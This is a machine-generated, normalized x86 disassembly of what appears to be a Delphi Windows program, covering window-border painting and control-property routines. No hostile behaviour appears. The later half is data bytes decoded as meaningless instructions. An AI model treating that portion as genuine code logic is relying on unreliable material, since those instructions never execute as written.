push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42a6ec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42a82c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42a6ec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42a894
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4047b8
push eax
mov eax esi
call sub_4047a8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42a6ec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42a8f8
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42a97c
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42a9b8
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42a9d5 ]
jmp [ eax * 4 + jump_table_42aa3e ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42ad44
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42a97c
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42a7e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_41240c
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42aecc
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af0e
retn
mov eax [ rw-data ]
call sub_403234
mov eax rw-data
call sub_403f6c
sub_42cb30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_42cec1
into
inc edx
add [ edi ] al
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
enter 0x42cd 0x0
push eax
int 0x42
add [ 0x74530800 ] dh
inc ebx
je r-xdata
push [ eax ]
add dh bh
jl r-xdata
insb
jae r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
pop eax
or eax 0x10043
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
hlt
add [ eax + 0x3c004123 ] bl
add [ eax ] al
dec ah
inc bx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
in al 0xd
inc ecx
add [ eax ] dl
add al [ eax ]
[ eax + 0xd ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x73580043
inc ebx
add [ eax + 0x54004373 ] cl
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
inc ebx
add [ eax + eax ] dh
[ eax + ebx * 4 ]
fadd [ ebx ]
movsb [ edi ] [ esi ]
fadd [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
add eax 0x336c7443
inc esp
mov ah 0x1e
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
dec [ esp + esi * 2 + 0x43 ]
jae r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add bh bh
dec esp
je r-xdata
jb r-xdata
add bh bh
sbb al 0x75
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ esp + esi * 2 + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
and eax 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
outsb
je r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
fadd [ ebx ]
pop esp
fld [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and [ eax ] al
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
adc [ eax ] al
test eax 0xb0ff0001
fadd [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
push edi
jb r-xdata
add [ eax ] al
sbb [ edi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
inc esp
add [ eax + eax ] bh
call [ eax ]
jae r-xdata
jb r-xdata
or dl [ eax + 0x61 ]
and eax 0xdcdc0043
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
jo r-xdata
adc [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc ebx
imul ebp [ esi + 0x74 ] r-xdata
fcomp st4
add [ ebp + ebx * 8 + 0x43 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
js r-xdata
jo r-xdata
adc [ eax ] al
0xccff0000 0x4374
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941d2d4
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
cmovno eax [ eax ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
hlt
adc [ eax ] al
push edi
add [ eax ] al
add [ eax ] al
and [ 0x6e4f0e00 ] 0x43
outsd
outsb
je r-xdata
inc ebx
add ah dl
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
mov al 0xc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
push [ ebp + ebx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
test [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al 0x0
dec ebx
jns r-xdata
push esp
cmovno eax [ eax ]
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] al
js r-xdata
jb r-xdata
push edi
adc [ eax ] al
cdq
add [ eax ] al
[ eax + 0x70004374 ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
[ eax ]
add [ eax + 0x4f0a0028 ] al
outsb
sub [ ebx ] al
[ eax ] al
push eax
add [ eax ] al
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
outsb
inc esp
jb r-xdata
in al dx
push eax
outsd
jo r-xdata
loopne r-xdata
jo r-xdata
daa
sub [ eax ] 0x43
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
sub [ ebx ] eax
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
daa
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
sub [ ebx ] eax
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmovno eax [ eax ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add [ eax ] al
add [ eax ] al
add ah al
aad 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 + 0x140042 ] ch
push ebp
jo r-xdata
arpl [ ebx - 0x5c ] bp
sub [ ebx ] eax
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
push ebx
je r-xdata
dec edi
outsb
pop eax
daa
inc ebx
add al ah
add [ eax ] al
jmp eax
xor al 0x28
inc ebx
add al ch
add [ eax ] eax
outsb
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
sub [ ebx ] al
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
dec ebp
outsd
jne r-xdata
sub eax [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
add al bh
inc ecx
inc ecx
inc eax
add al ch
xor [ eax ] eax
enter 0x4140 0x0
enter 0x413e 0x0
add [ ebx + 0x41 ] al
jb r-xdata
inc ebx
add al bl
add [ eax ] al
shl [ edi ] 0x1
add [ eax ] al
sbb [ edx + eax * 2 + 0x40346400 ] bh
add [ eax + 0x34 ] dh
inc eax
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
aad 0x42
add [ eax + eax ] dl
jb r-xdata
add [ eax - 0x15 ] bh
inc edx
add [ ebp + eax * 2 - 0x153fffbf ] al
inc edx
add ah bl
0x45e40042 0x41
inc esp
jb r-xdata
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffffc843155a
xor al 0x40
inc esp
outsd
inc eax
inc ecx
add al cl
inc ecx
add [ eax ] al
inc ebx
inc ecx
add al cl
nop
sub_42d06d
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
push eax
popad
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ esi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
or dl [ eax + 0x61 ]
and eax 0xdcdc0043
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
js r-xdata
jo r-xdata
adc [ eax ] al
0xccff0000 0x4374
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
and [ 0x6e4f0e00 ] 0x43
outsd
outsb
je r-xdata
inc ebx
add ah dl
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
mov al 0xc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
push [ ebp + ebx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsd
sbb al 0x0
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
test [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
fadd [ ebx ]
pop esp
fld [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and [ eax ] al
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
push 0x6948776f
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0xb0ff0001
fadd [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
add [ eax ] al
js r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
adc [ eax ] al
push edi
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
[ eax + 0x70004374 ]
jb r-xdata
push edi
jb r-xdata
add [ eax ] al
sbb [ edi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
inc esp
add [ eax + eax ] bh
call [ eax ]
jae r-xdata
add [ eax ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc ebx
imul ebp [ esi + 0x74 ] r-xdata
fcomp st4
add [ ebp + ebx * 8 + 0x43 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f07002b ] al
push esp
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
sub [ ebx ] eax
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
cmovno eax [ eax ]
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941d2d4
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
cmovno eax [ eax ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
hlt
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
sub [ ebx ] eax
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmovno eax [ eax ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
[ eax ]
sub [ ebx ] al
[ eax ] al
push eax
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
loopne r-xdata
jo r-xdata
daa
sub [ eax ] 0x43
add al ah
add [ eax ] eax
jmp eax
dec edi
outsb
pop eax
daa
inc ebx
add al ah
add [ eax ] al
jmp eax
xor al 0x28
inc ebx
add al ch
add [ eax ] eax
outsb
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
sub [ ebx ] al
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
